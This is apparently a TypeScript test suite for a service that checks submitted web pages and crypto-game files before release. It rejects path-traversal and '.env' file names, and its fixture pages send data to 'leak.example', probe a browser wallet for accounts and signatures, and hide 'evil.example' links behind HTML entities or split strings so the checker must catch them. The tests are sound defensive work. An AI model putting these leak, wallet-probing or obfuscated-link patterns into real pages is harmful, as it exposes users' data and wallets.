// The service the engine calls: request validation, a replay end to end over HTTP (state dump in, verdict out), and a
// build that fails to compile coming back as an answer, not a crash.
import assert from "node:assert/strict";
import type { AddressInfo } from "node:net";
import { after, before, describe, test } from "node:test";
import { PAGECHECK, requestIssues, serve, settings } from "../src/server.ts";
import { rpc, startAnvil } from "../src/util.ts";
import { guardScript } from "../../web/app/_ui/guard.ts";
import { chromiumPath, FACTORY, GAME, WORD } from "./helpers.ts";

const CHROMIUM = chromiumPath();
const WEB = new URL("../../web/", import.meta.url).pathname.replace(/\/$/, "");
const ok = { mode: "replay" as const, slug: "x-game", origin: "https://play.example.xyz", game: GAME, factory: FACTORY, state: "0x1f8b", files: { "/g/x-game": { b64: "", type: "text/html" } } };

test("requests: only what the engine sends gets through", () => {
  assert.deepEqual(requestIssues(ok), []);
  assert.deepEqual(requestIssues({ ...ok, chain: { baseFee: "0x3b9aca00", coinbase: `0x${"95".repeat(20)}` } }), []);
  assert.deepEqual(requestIssues({ ...ok, mode: "build", files: { "page.tsx": "x", "game.json": "{}" } }), []);
  for (const [what, r] of [
    ["mode", { ...ok, mode: "x" }],
    ["slug", { ...ok, slug: "../x" }],
    ["origin", { ...ok, origin: "http://x" }],
    ["game", { ...ok, game: "0x1" }],
    ["state", { ...ok, state: "{}" }],
    ["chain", { ...ok, chain: { baseFee: "0x3b9aca00", coinbase: `0x${"0".repeat(40)}` } }],
    ["chain", { ...ok, chain: { baseFee: "lots", coinbase: `0x${"95".repeat(20)}` } }],
    ["files", { ...ok, files: {} }],
    ["file", { ...ok, mode: "build", files: { "../../app/layout.tsx": "x" } }],
    ["file", { ...ok, mode: "build", files: { ".env": "x" } }],
    ["file", { ...ok, files: { "g/x": { b64: "", type: "t" } } }],
  ] as const) assert.ok(requestIssues(r as never).some((i) => i.startsWith(what)), what);
});

test("site requests: plain files under app/ and up to 10 plain routes; no game or chain state needed", () => {
  const site = { mode: "site" as const, origin: "https://example.xyz", files: { "app/faq/page.tsx": "x", "app/journal/[day]/Entry.tsx": "x", "app/old/Gone.tsx": null }, routes: ["/faq", "/"] };
  assert.deepEqual(requestIssues(site), []);
  for (const [what, r] of [
    ["origin", { ...site, origin: "http://x" }],
    ["files", { ...site, files: {} }],
    ["file", { ...site, files: { "app/../security.ts": "x" } }],
    ["file", { ...site, files: { "next.config.ts": "x" } }],
    ["file", { ...site, files: { "app/.env": "x" } }],
    ["file", { ...site, files: { "app/faq/page.tsx": 1 } }],
    ["routes", { ...site, routes: [] }],
    ["routes", { ...site, routes: ["/faq/../api"] }],
    ["routes", { ...site, routes: ["https://x"] }],
    ["routes", { ...site, routes: Array(11).fill("/faq") }],
  ] as const) assert.ok(requestIssues(r as never).some((i) => i.startsWith(what)), `${what}: ${JSON.stringify(r).slice(0, 80)}`);
});

test("settings: the gate runs 48 h on phone and desktop; the public hour runs 7 days on three profiles", () => {
  assert.equal(settings(false).hours, 48);
  assert.deepEqual(settings(false).profiles.map((p) => p.name), ["phone", "desktop"]);
  assert.equal(settings(true).hours, 168);
  assert.deepEqual(settings(true).profiles.map((p) => p.name), ["phone", "desktop", "tablet"]);
});

describe("over HTTP", { skip: CHROMIUM ? false : "needs a Chromium (PAGECHECK_CHROMIUM)" }, () => {
  let url = "";
  let close = () => {};
  let state = "";
  before(async () => {
    const s = serve({ ...PAGECHECK, chromium: CHROMIUM!, web: WEB });
    await new Promise<void>((r) => s.listen(0, "127.0.0.1", r));
    url = `http://127.0.0.1:${(s.address() as AddressInfo).port}`;
    close = () => s.close();
    const a = await startAnvil();
    try {
      await rpc(a.url, "anvil_setCode", [GAME, WORD(0)]);
      await rpc(a.url, "anvil_setCode", [FACTORY, WORD(1)]);
      state = await rpc<string>(a.url, "anvil_dumpState");
    } finally {
      a.stop();
    }
  });
  after(() => close());
  const post = async (r: unknown) => (await fetch(`${url}/check`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(r) })).json() as Promise<{ ok: boolean; violations?: { kind: string }[]; error?: string }>;

  test("a replay: the live files and the engine's state dump in, a kill verdict out; a second request meanwhile gets 409", async () => {
    const g = guardScript({ slug: "x-game", address: GAME, factory: FACTORY, selectors: ["0x7d55923d"], chainId: "0x1", killUrl: "/api/kill/x-game" });
    const html = `<html><head><script>${g}</script></head><body><div data-dna-game></div><script>ethereum.request({ method: "eth_sign" }).catch(() => {})</script></body></html>`;
    const first = post({ ...ok, state, files: { "/g/x-game": { b64: Buffer.from(html).toString("base64"), type: "text/html" } } });
    await new Promise((x) => setTimeout(x, 300));
    // one check at a time: another request meanwhile is told so at once (the engine retries), never queued behind it
    const busy = await fetch(`${url}/check`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ ...ok, state, files: { "/g/x-game": { b64: "", type: "text/html" } } }) });
    assert.equal(busy.status, 409);
    const r = await first;
    assert.equal(r.ok, false);
    assert.ok(r.violations!.some((v) => v.kind === "refused"));
  });

  test("a build whose page does not compile is an answer (rework), not a crash", async () => {
    const r = await post({ ...ok, mode: "build", state, files: { "page.tsx": `"use client";\nexport default function P() { return <p>{undefinedThing}</p>; }`, "game.json": JSON.stringify({ slug: "x-game", title: "x", chainId: 1, address: GAME, codehash: "0x" + "00".repeat(32), abi: [] }) } });
    assert.equal(r.ok, false);
    assert.match(r.error ?? "", /does not build/);
  });

  test("a site change: built as the main site; a page that reaches off the origin or for a wallet is caught, a plain one passes", async () => {
    const leak = `"use client";
import { useEffect } from "react";
export default function P() {
  useEffect(() => {
    fetch("https://leak.example/x?d=1").catch(() => {});
    (window as unknown as { ethereum?: { request: (a: unknown) => Promise<unknown> } }).ethereum?.request({ method: "eth_accounts" }).catch(() => {});
  }, []);
  return <main>leak</main>;
}
`;
    const r = await post({ mode: "site", origin: "https://example.xyz", routes: ["/pc-clean", "/how-it-works", "/pc-leak"], files: { "app/pc-clean/page.tsx": "export default function P() { return <main><button>ok</button></main>; }\n", "app/pc-leak/page.tsx": leak } }) as { ok: boolean; error?: string; violations: { kind: string; run: string; detail: string }[] };
    assert.equal(r.error, undefined);
    assert.equal(r.ok, false);
    assert.deepEqual(r.violations.filter((v) => v.run.startsWith("/pc-clean")), [], "the plain page passes");
    assert.deepEqual(r.violations.filter((v) => v.run.startsWith("/how-it-works")), [], "an existing page with the site's shell passes");
    const leaks = r.violations.filter((v) => v.run.startsWith("/pc-leak"));
    // the request off the origin: blocked by the site's CSP, or by the check's own route
    assert.ok(leaks.some((v) => (v.kind === "network" || v.kind === "csp") && /leak\.example/.test(v.detail)), JSON.stringify(leaks));
    assert.ok(leaks.some((v) => v.kind === "wallet" || v.kind === "decoy"), JSON.stringify(leaks));
  });

  test("a site page's link off the site is caught as the browser resolves it: an HTML entity, a joined string; the shell's own link passes", async () => {
    const entity = `export default function P() { return <main><a href="https&#58;//evil.example/a">a</a></main>; }\n`;
    const joined = `const h = "https:/" + "/evil.example/b";\nexport default function P() { return <main><a href={h}>b</a><a href="mailto:x@evil.example">c</a></main>; }\n`;
    const r = await post({ mode: "site", origin: "https://example.xyz", routes: ["/pc-entity", "/pc-joined", "/xp"], files: { "app/pc-entity/page.tsx": entity, "app/pc-joined/page.tsx": joined } }) as { ok: boolean; error?: string; violations: { kind: string; run: string; detail: string }[] };
    assert.equal(r.error, undefined);
    const of = (route: string) => r.violations.filter((v) => v.run.startsWith(`${route} `));
    assert.ok(of("/pc-entity").some((v) => v.kind === "network" && /a link off the site: https:\/\/evil\.example\/a/.test(v.detail)), JSON.stringify(of("/pc-entity")));
    assert.ok(of("/pc-joined").some((v) => v.kind === "network" && /evil\.example\/b/.test(v.detail)), JSON.stringify(of("/pc-joined")));
    assert.ok(of("/pc-joined").some((v) => /mailto:/.test(v.detail)), "a link that is not http(s)");
    assert.deepEqual(of("/xp"), [], "a page with the shell's own link to X passes");
  });

  test("a site change's removed file is removed from the build: a page that still imports it fails to build (a rework, not a pass)", async () => {
    const r = await post({ mode: "site", origin: "https://example.xyz", routes: ["/xp"], files: { "app/_ui/ui.tsx": null } });
    assert.equal(r.ok, false);
    assert.match(r.error ?? "", /does not build/);
  });

  test("a malformed request is refused before anything runs", async () => {
    const r = await fetch(`${url}/check`, { method: "POST", body: "{}" });
    assert.equal(r.status, 400);
  });
});
